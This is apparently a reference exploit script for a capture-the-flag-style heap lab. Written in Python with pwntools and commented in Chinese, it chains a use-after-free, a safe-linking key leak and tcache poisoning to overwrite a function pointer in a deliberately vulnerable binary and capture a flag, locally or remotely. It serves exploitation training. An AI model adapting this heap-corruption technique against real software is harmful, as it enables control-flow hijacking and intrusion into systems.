#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""lab_tcache_poisoning —— tcache poisoning（safe-linking 版）参考 exploit

漏洞链：free 不清空 notes[] → show 泄漏 safe-linking 的 key（a >> 12）
        → edit 改写队尾 chunk 的 next → malloc 落到 .bss 的 fh.fn → 劫持控制流。

用法：
    cd labs/lab_tcache_poisoning
    make
    printf '__PWNED__{tcache}\\n' > flag.txt
    python exp.py            # 本地
    HOST=1.2.3.4 PORT=9999 python exp.py   # 远程（等价于 socat 起服务）
"""
import os
import sys

from pwn import *

context.arch = "amd64"
context.log_level = "info"

BIN = "./chal"
HOST = os.getenv("HOST", "")
PORT = int(os.getenv("PORT", "9999"))


def start():
    if HOST:
        return remote(HOST, PORT)
    return process(BIN)


def add(p, idx, size, data):
    p.sendlineafter(b"choice: ", b"1")
    p.sendlineafter(b"index: ", str(idx).encode())
    p.sendlineafter(b"size: ", str(size).encode())
    p.sendafter(b"data: ", data)


def edit(p, idx, data):
    p.sendlineafter(b"choice: ", b"2")
    p.sendlineafter(b"index: ", str(idx).encode())
    p.sendafter(b"data: ", data)


def free(p, idx):
    p.sendlineafter(b"choice: ", b"3")
    p.sendlineafter(b"index: ", str(idx).encode())
    p.recvuntil(b"done")


def show(p, idx, n):
    p.sendlineafter(b"choice: ", b"4")
    p.sendlineafter(b"index: ", str(idx).encode())
    out = p.recvn(n)
    p.recvline()
    return out


def exploit():
    e = ELF(BIN, checksec=False)
    fh = e.symbols["fh"]                 # 被劫持的函数指针（.bss，16 字节对齐）
    backdoor = e.symbols["backdoor"]
    log.info("fh = %#x, backdoor = %#x", fh, backdoor)

    p = start()

    # 1) 两个同 size 的 chunk：A=notes[0]、B=notes[1]
    add(p, 0, 0x40, b"A" * 0x40)
    add(p, 1, 0x40, b"B" * 0x40)

    # 2) free(0) 后 tcache[0x50] 只有 A，A->next = 0 ^ (A>>12) → 泄漏 page key
    free(p, 0)
    leak = show(p, 0, 0x40)
    key_page = u64(leak[:8])
    log.success("safe-linking key (a >> 12) = %#x", key_page)

    # 3) free(1)：tcache 变成 B -> A
    free(p, 1)

    # 4) UAF 写 A->next = fh ^ (A>>12)
    edit(p, 0, p64(fh ^ key_page))

    # 5) 三次 malloc：B、A、&fh
    add(p, 2, 0x40, b"C" * 0x40)
    add(p, 3, 0x40, b"D" * 0x40)
    add(p, 4, 0x40, p64(backdoor).ljust(0x40, b"\x00"))

    # 6) 触发
    p.sendlineafter(b"choice: ", b"5")
    p.recvuntil(b"here is your flag:")
    return p.recvall(timeout=5)


if __name__ == "__main__":
    out = exploit()
    sys.stdout.buffer.write(out)
    sys.stdout.write("\n" if not out.endswith(b"\n") else "")
    if b"__PWNED__" not in out:
        raise SystemExit("[-] 没拿到 flag，检查 labs/lab_tcache_poisoning/flag.txt")
    log.success("tcache poisoning OK")
